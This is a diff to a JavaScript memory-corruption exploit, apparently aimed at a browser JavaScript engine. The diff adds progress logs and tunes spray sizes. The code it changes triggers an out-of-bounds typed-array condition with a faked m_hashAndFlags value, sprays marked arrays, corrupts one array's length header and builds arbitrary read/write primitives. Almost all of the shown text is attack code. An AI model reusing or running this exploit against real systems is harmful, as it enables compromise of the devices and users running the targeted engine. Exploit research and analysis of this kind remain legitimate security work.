@@ -379,19 +379,25 @@ for (var i = 0; i < structs.length; i++) {
   structs[i][`spray_${i}`] = 0x1337
 }
 
-var oob_arr = new Uint32Array(0x40000)
+log("Intiate OOB...")
+
+var oob_arr = new Uint32Array(0x80000)
 
 // fake m_hashAndFlags
 oob_arr[4] = 0xB0 
 
 make_oob(oob_arr)
 
+log("Achieved OOB !!")
+
+log("Spraying arrays with marker...")
 // spray candidates arrays to be used as leak primitive
-var spray = new Array(0x4000)
+var spray = new Array(0x1000)
 for (var i = 0; i < spray.length; i++) {
     spray[i] = [prim_marker.jsv(), {}]
 }
 
+log("Looking for marked array...")
 // find sprayed candidate by marker then corrupt its length 
 for (var i = 0; i < oob_arr.length; i += 2) {
   var val = new BigInt(oob_arr[i + 1], oob_arr[i])
@@ -400,6 +406,7 @@ for (var i = 0; i < oob_arr.length; i += 2) {
 
     prim_oob_idx = i - 2
 
+    log("Corrupting marked array length...")
     // corrupt indexing header
     oob_arr[prim_oob_idx] = 0x1337
     oob_arr[prim_oob_idx + 1] = 0x1337
@@ -407,19 +414,25 @@ for (var i = 0; i < oob_arr.length; i += 2) {
   }
 }
 
+if (prim_oob_idx === -1) {
+  throw new Error("Failed to find marked array !!")
+}
+
 // find index of corrupted array
 for (var i = 0; i < spray.length; i++) {
   if (spray[i].length === 0x1337) {
-    log(`Found corrupted primitive at spray[${i}]`)
+    log(`Found corrupted array at spray[${i}]`)
 
     prim_spray_idx = i
     break
   }
 }
 
-if (prim_oob_idx === -1 || prim_spray_idx === -1) {
-    throw new Error("failed !!")
+if (prim_spray_idx === -1) {
+    throw new Error("Failed to find corrupted array !!")
 }
+
+log("Intiate RW primitives...")
 
 var prim_oob_obj_idx = prim_oob_idx + 4
 
@@ -457,7 +470,7 @@ while (!(master instanceof Uint32Array)) {
 
 master_addr = new BigInt(master[5], master[4])
 
-log(`Achieved RW primitives !!`)
+log("Achieved RW primitives !!")
 log(`master_addr: ${master_addr}`)
 
 // rw primitive
